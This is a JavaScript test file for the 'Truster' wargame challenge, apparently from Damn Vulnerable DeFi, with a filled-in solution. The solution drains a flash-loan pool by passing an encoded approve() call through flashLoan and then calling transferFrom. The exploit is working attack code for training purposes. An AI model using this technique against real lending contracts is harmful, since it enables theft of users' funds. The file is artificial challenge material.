const { ethers } = require('hardhat');
const { expect } = require('chai');

describe('[Challenge] Truster', function () {
    let deployer, attacker;

    const TOKENS_IN_POOL = ethers.utils.parseEther('1000000');

    before(async function () {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
        [deployer, attacker] = await ethers.getSigners();

        const DamnValuableToken = await ethers.getContractFactory('DamnValuableToken', deployer);
        const TrusterLenderPool = await ethers.getContractFactory('TrusterLenderPool', deployer);

        this.token = await DamnValuableToken.deploy();
        this.pool = await TrusterLenderPool.deploy(this.token.address);

        await this.token.transfer(this.pool.address, TOKENS_IN_POOL);

        expect(
            await this.token.balanceOf(this.pool.address)
        ).to.equal(TOKENS_IN_POOL);

        expect(
            await this.token.balanceOf(attacker.address)
        ).to.equal('0');
    });

    it('Exploit', async function () {
        /** CODE YOUR EXPLOIT HERE  */

        // Connect as the attacker.
        this.token = this.token.connect(attacker);
        this.pool = this.pool.connect(attacker);
        
        // initial attacker's token balance
        var attacker_token_balance = await this.token.balanceOf(attacker.address);
        console.log(" initial attacker's token balance: " + attacker_token_balance);

        // initial pool's token balance
        var pool_token_balance = await this.token.balanceOf(this.pool.address);
        console.log(" initial pool's token balance: " + pool_token_balance);

        // Craft the payload that we will send to the pool.
        const ABI = ["function approve(address spender, uint256 amount)"];
        const interface = new ethers.utils.Interface(ABI);
        const payload = interface.encodeFunctionData("approve", [attacker.address, TOKENS_IN_POOL.toString()]);

        await this.pool.flashLoan(0, attacker.address, this.token.address, payload);
        await this.token.transferFrom(this.pool.address, attacker.address, TOKENS_IN_POOL);

        // updated attacker's token balance
        var attacker_token_balance = await this.token.balanceOf(attacker.address);
        console.log(" updated attacker's token balance: " + attacker_token_balance);

        // updated pool's token balance
        var pool_token_balance = await this.token.balanceOf(this.pool.address);
        console.log(" updated pool's token balance: " + pool_token_balance);
    });

    after(async function () {
        /** SUCCESS CONDITIONS */

        // Attacker has taken all tokens from the pool
        expect(
            await this.token.balanceOf(attacker.address)
        ).to.equal(TOKENS_IN_POOL);
        expect(
            await this.token.balanceOf(this.pool.address)
        ).to.equal('0');
    });
});

